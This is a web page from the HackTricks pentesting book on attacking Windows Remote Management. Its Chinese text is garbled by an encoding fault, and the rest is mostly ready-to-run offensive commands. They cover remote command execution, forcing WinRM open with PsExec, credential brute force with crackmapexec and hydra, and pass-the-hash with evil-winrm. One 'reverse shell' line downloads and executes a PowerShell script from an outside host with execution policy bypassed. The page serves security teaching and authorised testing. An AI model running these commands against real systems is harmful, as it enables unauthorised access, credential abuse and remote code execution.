<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>5985,5986 - Pentesting WinRM</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="59855986---pentesting-winrm"><a class="header" href="#59855986---pentesting-winrm">5985,5986 - Pentesting WinRM</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**</li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œä¿æŒå¯¹å¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œçš„äº†è§£</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ï¼Œ</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼</p>
<h2 id="winrm"><a class="header" href="#winrm">WinRM</a></h2>
<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx">Windows è¿œç¨‹ç®¡ç† (WinRM)</a> è¢«å¾®è½¯å¼ºè°ƒä¸ºä¸€ç§ <strong>åè®®</strong>ï¼Œå®ƒé€šè¿‡ HTTP(S) å®ç° <strong>å¯¹ Windows ç³»ç»Ÿçš„è¿œç¨‹ç®¡ç†</strong>ï¼Œå¹¶åœ¨æ­¤è¿‡ç¨‹ä¸­åˆ©ç”¨ SOAPã€‚å®ƒåŸºæœ¬ä¸Šç”± WMI æä¾›æ”¯æŒï¼Œå‘ˆç°ä¸º WMI æ“ä½œçš„åŸºäº HTTP çš„æ¥å£ã€‚</p>
<p>æœºå™¨ä¸Šå­˜åœ¨ WinRM å…è®¸é€šè¿‡ PowerShell è¿›è¡Œç®€å•çš„è¿œç¨‹ç®¡ç†ï¼Œç±»ä¼¼äº SSH åœ¨å…¶ä»–æ“ä½œç³»ç»Ÿä¸­çš„å·¥ä½œæ–¹å¼ã€‚è¦ç¡®å®š WinRM æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œå»ºè®®æ£€æŸ¥ç‰¹å®šç«¯å£çš„å¼€æ”¾æƒ…å†µï¼š</p>
<ul>
<li><strong>5985/tcp (HTTP)</strong></li>
<li><strong>5986/tcp (HTTPS)</strong></li>
</ul>
<p>ä¸Šè¿°åˆ—è¡¨ä¸­çš„å¼€æ”¾ç«¯å£è¡¨ç¤º WinRM å·²è¢«è®¾ç½®ï¼Œä»è€Œå…è®¸å°è¯•å¯åŠ¨è¿œç¨‹ä¼šè¯ã€‚</p>
<h3 id="å¯åŠ¨-winrm-ä¼šè¯"><a class="header" href="#å¯åŠ¨-winrm-ä¼šè¯"><strong>å¯åŠ¨ WinRM ä¼šè¯</strong></a></h3>
<p>è¦ä¸º WinRM é…ç½® PowerShellï¼Œå¾®è½¯çš„ <code>Enable-PSRemoting</code> cmdlet å°†å‘æŒ¥ä½œç”¨ï¼Œè®¾ç½®è®¡ç®—æœºä»¥æ¥å—è¿œç¨‹ PowerShell å‘½ä»¤ã€‚é€šè¿‡æå‡çš„ PowerShell è®¿é—®æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä»¥å¯ç”¨æ­¤åŠŸèƒ½å¹¶å°†ä»»ä½•ä¸»æœºæŒ‡å®šä¸ºå—ä¿¡ä»»ï¼š</p>
<pre><code class="language-powershell">Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
</code></pre>
<p>è¿™ç§æ–¹æ³•æ¶‰åŠåœ¨ <code>trustedhosts</code> é…ç½®ä¸­æ·»åŠ é€šé…ç¬¦ï¼Œè¿™ä¸€æ­¥éª¤éœ€è¦è°¨æ…è€ƒè™‘å…¶å½±å“ã€‚è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯èƒ½éœ€è¦å°†æ”»å‡»è€…æœºå™¨ä¸Šçš„ç½‘ç»œç±»å‹ä»â€œå…¬å…±â€æ›´æ”¹ä¸ºâ€œå·¥ä½œâ€ã€‚</p>
<p>æ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨ <code>wmic</code> å‘½ä»¤<strong>è¿œç¨‹æ¿€æ´»</strong> WinRMï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-powershell">wmic /node:&lt;REMOTE_HOST&gt; process call create "powershell enable-psremoting -force"
</code></pre>
<p>è¿™ç§æ–¹æ³•å…è®¸è¿œç¨‹è®¾ç½® WinRMï¼Œä»è€Œå¢å¼ºäº†è¿œç¨‹ç®¡ç† Windows æœºå™¨çš„çµæ´»æ€§ã€‚</p>
<h3 id="æµ‹è¯•æ˜¯å¦å·²é…ç½®"><a class="header" href="#æµ‹è¯•æ˜¯å¦å·²é…ç½®">æµ‹è¯•æ˜¯å¦å·²é…ç½®</a></h3>
<p>è¦éªŒè¯æ”»å‡»æœºå™¨çš„è®¾ç½®ï¼Œä½¿ç”¨ <code>Test-WSMan</code> å‘½ä»¤æ£€æŸ¥ç›®æ ‡æ˜¯å¦æ­£ç¡®é…ç½®äº† WinRMã€‚é€šè¿‡æ‰§è¡Œæ­¤å‘½ä»¤ï¼Œæ‚¨åº”è¯¥æœŸæœ›æ”¶åˆ°æœ‰å…³åè®®ç‰ˆæœ¬å’Œ wsmid çš„è¯¦ç»†ä¿¡æ¯ï¼ŒæŒ‡ç¤ºé…ç½®æˆåŠŸã€‚ä»¥ä¸‹æ˜¯æ¼”ç¤ºå·²é…ç½®ç›®æ ‡ä¸æœªé…ç½®ç›®æ ‡é¢„æœŸè¾“å‡ºçš„ç¤ºä¾‹ï¼š</p>
<ul>
<li>å¯¹äºä¸€ä¸ª <strong>å·²</strong> æ­£ç¡®é…ç½®çš„ç›®æ ‡ï¼Œè¾“å‡ºå°†ç±»ä¼¼äºï¼š</li>
</ul>
<pre><code class="language-bash">Test-WSMan &lt;target-ip&gt;
</code></pre>
<p>å“åº”åº”åŒ…å«æœ‰å…³åè®®ç‰ˆæœ¬å’Œwsmidçš„ä¿¡æ¯ï¼Œè¡¨æ˜WinRMå·²æ­£ç¡®è®¾ç½®ã€‚</p>
<p><img src="../.gitbook/assets/image%20(582).png" alt="" /></p>
<ul>
<li>ç›¸åï¼Œå¯¹äº<strong>æœª</strong>é…ç½®WinRMçš„ç›®æ ‡ï¼Œå°†ä¸ä¼šè¿”å›å¦‚æ­¤è¯¦ç»†çš„ä¿¡æ¯ï¼Œçªæ˜¾å‡ºç¼ºä¹é€‚å½“çš„WinRMè®¾ç½®ã€‚</li>
</ul>
<p><img src="../.gitbook/assets/image%20(458).png" alt="" /></p>
<h3 id="æ‰§è¡Œå‘½ä»¤"><a class="header" href="#æ‰§è¡Œå‘½ä»¤">æ‰§è¡Œå‘½ä»¤</a></h3>
<p>è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿œç¨‹æ‰§è¡Œ<code>ipconfig</code>å¹¶æŸ¥çœ‹å…¶è¾“å‡ºï¼Œè¯·æ‰§è¡Œï¼š</p>
<pre><code class="language-powershell">Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
</code></pre>
<p><img src="../.gitbook/assets/image%20(151).png" alt="" /></p>
<p>æ‚¨è¿˜å¯ä»¥é€šè¿‡ <em><strong>Invoke-Command</strong></em> <strong>åœ¨å½“å‰ PS æ§åˆ¶å°ä¸­æ‰§è¡Œå‘½ä»¤</strong>ã€‚å‡è®¾æ‚¨åœ¨æœ¬åœ°æœ‰ä¸€ä¸ªåä¸º <em><strong>enumeration</strong></em> çš„å‡½æ•°ï¼Œå¹¶ä¸”æ‚¨æƒ³è¦ <strong>åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šæ‰§è¡Œå®ƒ</strong>ï¼Œæ‚¨å¯ä»¥è¿™æ ·åšï¼š</p>
<pre><code class="language-powershell">Invoke-Command -ComputerName &lt;computername&gt; -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
</code></pre>
<h3 id="æ‰§è¡Œè„šæœ¬"><a class="header" href="#æ‰§è¡Œè„šæœ¬">æ‰§è¡Œè„šæœ¬</a></h3>
<pre><code class="language-powershell">Invoke-Command -ComputerName &lt;computername&gt; -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
</code></pre>
<h3 id="è·å–åå‘-shell"><a class="header" href="#è·å–åå‘-shell">è·å–åå‘ shell</a></h3>
<pre><code class="language-powershell">Invoke-Command -ComputerName &lt;computername&gt; -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
</code></pre>
<h3 id="è·å–-ps-ä¼šè¯"><a class="header" href="#è·å–-ps-ä¼šè¯">è·å– PS ä¼šè¯</a></h3>
<p>è¦è·å–äº¤äº’å¼ PowerShell shellï¼Œè¯·ä½¿ç”¨ <code>Enter-PSSession</code>ï¼š</p>
<pre><code class="language-powershell">#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
</code></pre>
<p><img src="../.gitbook/assets/image%20(1009).png" alt="" /></p>
<p><strong>ä¼šè¯å°†åœ¨â€œå—å®³è€…â€å†…éƒ¨çš„ä¸€ä¸ªæ–°è¿›ç¨‹ï¼ˆwsmprovhostï¼‰ä¸­è¿è¡Œ</strong></p>
<h3 id="å¼ºåˆ¶æ‰“å¼€-winrm"><a class="header" href="#å¼ºåˆ¶æ‰“å¼€-winrm"><strong>å¼ºåˆ¶æ‰“å¼€ WinRM</strong></a></h3>
<p>è¦ä½¿ç”¨ PS Remoting å’Œ WinRMï¼Œä½†è®¡ç®—æœºæœªé…ç½®ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯ç”¨å®ƒï¼š</p>
<pre><code class="language-powershell">.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
</code></pre>
<h3 id="ä¿å­˜å’Œæ¢å¤ä¼šè¯"><a class="header" href="#ä¿å­˜å’Œæ¢å¤ä¼šè¯">ä¿å­˜å’Œæ¢å¤ä¼šè¯</a></h3>
<p>å¦‚æœè¿œç¨‹è®¡ç®—æœºä¸­çš„<strong>è¯­è¨€</strong>å—åˆ°<strong>é™åˆ¶</strong>ï¼Œåˆ™æ­¤<strong>æ— æ•ˆ</strong>ã€‚</p>
<pre><code class="language-powershell">#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName &lt;computername&gt; [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
</code></pre>
<p>åœ¨æ­¤ä¼šè¯ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <em>Invoke-Command</em> åŠ è½½ PS è„šæœ¬ã€‚</p>
<pre><code class="language-powershell">Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
</code></pre>
<h3 id="é”™è¯¯"><a class="header" href="#é”™è¯¯">é”™è¯¯</a></h3>
<p>å¦‚æœæ‚¨å‘ç°ä»¥ä¸‹é”™è¯¯ï¼š</p>
<p><code>enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.</code></p>
<p>å°è¯•åœ¨å®¢æˆ·ç«¯ï¼ˆä¿¡æ¯æ¥è‡ª <a href="https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server">è¿™é‡Œ</a>)ï¼š</p>
<pre><code class="language-ruby">winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
</code></pre>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢æ´å¯Ÿ</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼</p>
<h2 id="åœ¨linuxä¸­è¿æ¥winrm"><a class="header" href="#åœ¨linuxä¸­è¿æ¥winrm">åœ¨Linuxä¸­è¿æ¥WinRM</a></h2>
<h3 id="æš´åŠ›ç ´è§£"><a class="header" href="#æš´åŠ›ç ´è§£">æš´åŠ›ç ´è§£</a></h3>
<p>å°å¿ƒï¼Œæš´åŠ›ç ´è§£winrmå¯èƒ½ä¼šé˜»æ­¢ç”¨æˆ·ã€‚</p>
<pre><code class="language-ruby">#Brute force
crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u &lt;username&gt; -p &lt;password&gt; -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u &lt;username&gt; -H &lt;HASH&gt; -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
</code></pre>
<h3 id="ä½¿ç”¨-evil-winrm"><a class="header" href="#ä½¿ç”¨-evil-winrm">ä½¿ç”¨ evil-winrm</a></h3>
<pre><code class="language-ruby">gem install evil-winrm
</code></pre>
<p>é˜…è¯»å…¶ GitHub ä¸Šçš„ <strong>documentation</strong>: <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
<pre><code class="language-ruby">evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i &lt;IP&gt;/&lt;Domain&gt;
</code></pre>
<p>è¦ä½¿ç”¨ evil-winrm è¿æ¥åˆ° <strong>IPv6 åœ°å€</strong>ï¼Œåœ¨ <em><strong>/etc/hosts</strong></em> ä¸­åˆ›å»ºä¸€ä¸ªæ¡ç›®ï¼Œå°† <strong>åŸŸå</strong> è®¾ç½®ä¸º IPv6 åœ°å€å¹¶è¿æ¥åˆ°è¯¥åŸŸåã€‚</p>
<h3 id="ä½¿ç”¨-evil-winrm-ä¼ é€’å“ˆå¸Œ"><a class="header" href="#ä½¿ç”¨-evil-winrm-ä¼ é€’å“ˆå¸Œ">ä½¿ç”¨ evil-winrm ä¼ é€’å“ˆå¸Œ</a></h3>
<pre><code class="language-ruby">evil-winrm -u &lt;username&gt; -H &lt;Hash&gt; -i &lt;IP&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(680).png" alt="" /></p>
<h3 id="ä½¿ç”¨-ps-docker-æœºå™¨"><a class="header" href="#ä½¿ç”¨-ps-docker-æœºå™¨">ä½¿ç”¨ PS-docker æœºå™¨</a></h3>
<pre><code>docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
</code></pre>
<h3 id="ä½¿ç”¨-ruby-è„šæœ¬"><a class="header" href="#ä½¿ç”¨-ruby-è„šæœ¬">ä½¿ç”¨ Ruby è„šæœ¬</a></h3>
<p><strong>ä»£ç æ‘˜è‡ªè¿™é‡Œ:</strong> <a href="https://alamot.github.io/winrm_shell/"><strong>https://alamot.github.io/winrm_shell/</strong></a></p>
<pre><code class="language-ruby">require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS&gt; UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification =&gt; true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
</code></pre>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:5985 Microsoft-HTTPAPI</code></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/</a></li>
</ul>
<h2 id="hacktricks-è‡ªåŠ¨å‘½ä»¤"><a class="header" href="#hacktricks-è‡ªåŠ¨å‘½ä»¤">HackTricks è‡ªåŠ¨å‘½ä»¤</a></h2>
<pre><code>Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
</code></pre>
<p>â€‹</p>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ï¼Œ</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œå¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œå§ï¼</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
